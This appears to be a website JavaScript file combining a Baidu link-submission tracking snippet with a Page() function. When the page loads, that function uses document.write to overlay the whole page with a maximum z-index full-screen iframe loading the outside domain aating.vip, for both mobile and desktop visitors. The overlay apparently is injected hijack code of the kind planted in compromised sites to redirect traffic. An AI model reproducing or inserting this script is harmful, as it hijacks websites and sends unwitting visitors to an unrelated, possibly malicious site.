(function(){
    var canonicalURL, curProtocol;
    //Get the <link> tag
    var x=document.getElementsByTagName("link");
    //Find the last canonical URL
    if(x.length > 0){
      for (i=0;i<x.length;i++){
        if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
          canonicalURL=x[i].href;
        }
      }
    }
    //Get protocol
      if (!canonicalURL){
        curProtocol = window.location.protocol.split(':')[0];
      }
      else{
        curProtocol = canonicalURL.split(':')[0];
      }
      //Get current URL if the canonical URL does not exist
      if (!canonicalURL) canonicalURL = window.location.href;
      //Assign script content. Replace current URL with the canonical URL
      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();

function Page() {
    if ((navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i))) {
        var url="http://aating.vip"; 
        var str1=document.title;  
        document.write('<meta id="viewport" name="viewport" content="user-scalable=no,width=device-width, initial-scale=1.0" />'); 
        document.write('<style>html,body{widht:100%;height:100%;overflow:hidden; clear:both;}</style>'); 
        document.write('<div style="width:100%;height:100%;position:absolute;top:0;left:0;z-index:2147483647;">'); 
        document.write('<iframe src=" '+url+'" frameborder="0" style="border:0;width: 100%; text-align: center; border: medium none; height:100%;max-height: 4000px;"></iframe>'); 
        document.write('</div>');
    }else{
      var url="http://aating.vip"; 
        var str1=document.title;  
        document.write('<meta id="viewport" name="viewport" content="user-scalable=no,width=device-width, initial-scale=1.0" />'); 
        document.write('<style>html,body{widht:100%;height:100%;overflow:hidden; clear:both;}</style>'); 
        document.write('<div style="width:100%;height:100%;position:absolute;top:0;left:0;z-index:2147483647;">'); 
        document.write('<iframe src=" '+url+'" frameborder="0" style="border:0;width: 100%; text-align: center; border: medium none; height:100%;max-height: 4000px;"></iframe>'); 
        document.write('</div>');
    }
    
}
    Page();